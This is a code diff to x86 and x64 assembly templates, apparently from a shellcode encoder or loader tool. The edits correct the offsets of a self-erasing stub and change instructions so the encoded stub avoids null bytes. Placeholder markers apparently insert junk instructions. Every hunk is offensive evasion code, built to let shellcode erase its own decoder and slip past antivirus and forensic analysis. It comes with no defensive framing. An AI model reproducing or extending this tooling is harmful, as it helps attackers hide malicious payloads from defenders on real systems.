@@ -252,7 +252,7 @@ entry:
  // erase useless functions and entry
  flag_eraser_1:
   lea ecx, [ebx + calc_entry_addr]        {{igi}}
-  mov edx, decoder_stub - calc_entry_addr {{igi}}
+  mov edx, eraser_stub - calc_entry_addr  {{igi}}
   call eraser_stub                        {{igi}}
 
   mov ecx, ebx                       {{igi}}
@@ -274,6 +274,7 @@ entry:
 
   // save the shellcode return value
   push eax                           {{igi}}
+
   // erase the shellcode stub
 {{if .EraseShellcode}}
   lea ecx, [ebx + shellcode_stub]    {{igi}}
@@ -284,13 +285,15 @@ entry:
   // erase the above instructions
  flag_eraser_2:
   mov ecx, ebx                       {{igi}}
-  mov edx, flag_eraser_2             {{igi}}
+  mov edx, flag_eraser_2 + 8         {{igi}}
   call eraser_stub                   {{igi}}
 
   // erase the eraser stub
   lea edi, [ebx + eraser_stub]       {{igi}}
   lea esi, [ebx + crypto_key_stub]   {{igi}}
-  mov ecx, {{hex .EraserLen}}        {{igi}}
+  // prevent appear three 0x00
+  xor ecx, ecx                       {{igi}}
+  add ecx, {{hex .EraserLen}}        {{igi}}
   cld                                {{igi}}
   rep movsb                          {{igi}}
 
@@ -406,7 +409,7 @@ entry:
   // erase useless functions and entry
  flag_eraser_1:
   lea rcx, [rbx + mini_xor]          {{igi}}
-  mov rdx, decoder_stub - mini_xor   {{igi}}
+  mov rdx, eraser_stub - mini_xor    {{igi}}
   call eraser_stub                   {{igi}}
 
   mov rcx, rbx                       {{igi}}
@@ -437,13 +440,15 @@ entry:
   // erase the above instructions
  flag_eraser_2:
   mov rcx, rbx                       {{igi}}
-  mov rdx, flag_eraser_2             {{igi}}
+  mov rdx, flag_eraser_2 + 8         {{igi}}
   call eraser_stub                   {{igi}}
 
   // erase the eraser stub
   lea rdi, [rbx + eraser_stub]       {{igi}}
   lea rsi, [rbx + crypto_key_stub]   {{igi}}
-  mov rcx, {{hex .EraserLen}}        {{igi}}
+  // prevent appear three 0x00
+  xor ecx, ecx                       {{igi}}
+  add rcx, {{hex .EraserLen}}        {{igi}}
   cld                                {{igi}}
   rep movsb                          {{igi}}
 
